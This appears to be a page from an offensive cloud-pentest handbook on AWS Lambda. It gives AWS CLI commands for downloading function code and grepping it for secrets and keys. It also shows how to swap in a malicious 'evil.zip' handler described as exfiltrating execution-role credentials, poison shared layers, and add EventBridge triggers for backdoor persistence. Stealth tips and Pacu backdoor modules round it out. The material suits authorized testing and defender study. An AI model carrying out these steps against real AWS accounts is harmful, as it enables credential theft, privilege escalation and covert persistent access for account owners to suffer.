---
title: "Code and layers: running attacker code under the execution role"
description: "Reading function source and layers for secrets, and overwriting code or layers to run under the execution role."
keywords:
  - Lambda
  - layers
  - source code
  - secrets
  - overwrite
---

# Code and layers

`lambda:GetFunction` returns a presigned URL to the function's deployment package, so its source can be downloaded and read for hard-coded secrets. With `lambda:UpdateFunctionCode` or `lambda:UpdateFunctionConfiguration`, the package or its **layers** can be replaced, and the next invocation runs attacker code under the function's [execution role](execution-role.md). A shared layer is a particularly quiet target: poisoning one layer version reaches every function that pins it.

## Reading the deployed code

```bash
aws lambda get-function --function-name <fn> --query 'Code.Location'   # presigned zip URL
curl -s "<presigned-url>" -o fn.zip && unzip -o fn.zip -d fn/
grep -rinE 'secret|password|token|AKIA' fn/
```

## Overwriting code to run under the role

```bash
# package a handler that exfiltrates the execution-role credentials, then
aws lambda update-function-code --function-name <fn> --zip-file fileb://evil.zip
aws lambda invoke --function-name <fn> /dev/stdout   # or wait for a natural trigger
```

## Poisoning a layer

```bash
aws lambda publish-layer-version --layer-name x --zip-file fileb://layer.zip
aws lambda update-function-configuration --function-name <fn> \
  --layers arn:aws:lambda:<region>:<acct>:layer:x:1
```

## Event-driven persistence

A backdoored function only pays off when it runs, so pair the code or layer swap with a trigger that re-invokes it even when no one calls the API it fronts, a dead-man's-switch that keeps re-establishing access.

```bash
# scheduled re-invoke via EventBridge
aws events put-rule --name keepalive --schedule-expression 'rate(1 hour)'
aws lambda add-permission --function-name <fn> --statement-id eb \
  --action lambda:InvokeFunction --principal events.amazonaws.com \
  --source-arn <rule-arn>
aws events put-targets --rule keepalive --targets "Id=1,Arn=<fn-arn>"
```

The quieter variant reacts to a specific API event rather than a clock; see [EventBridge](eventbridge.md) for the rule that re-invokes a backdoor whenever a chosen call appears.

## Exploitation notes

- Overwriting code is both a privilege path (run as the execution role) and durable persistence (the function stays changed until redeployed).
- Prefer waiting for a natural trigger over `invoke` when stealth matters, so the execution looks routine.
- Layers apply at the configuration level, so a layer swap leaves the function code untouched and is easy to miss in review.

## Tools

- **AWS CLI** (`lambda get-function`, `update-function-code`, `publish-layer-version`): read and replace.
- **Pacu** (`lambda__enum`): locate functions and their layers.
- **Pacu** (`lambda__backdoor_new_roles`, `lambda__backdoor_new_users`, `lambda__backdoor_new_sec_groups`): plant Lambda-backed backdoors that fire on CloudWatch event triggers.

## References

- [HackTricks Cloud: AWS Lambda persistence](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/index.html)
- [AWS: Lambda layers](https://docs.aws.amazon.com/lambda/latest/dg/chapter-layers.html)
- [Hacking the Cloud: AWS](https://hackingthe.cloud/)
- [Rhino Security Labs: AWS privilege escalation](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [Stratus Red Team: AWS techniques](https://stratus-red-team.cloud/attack-techniques/AWS/)
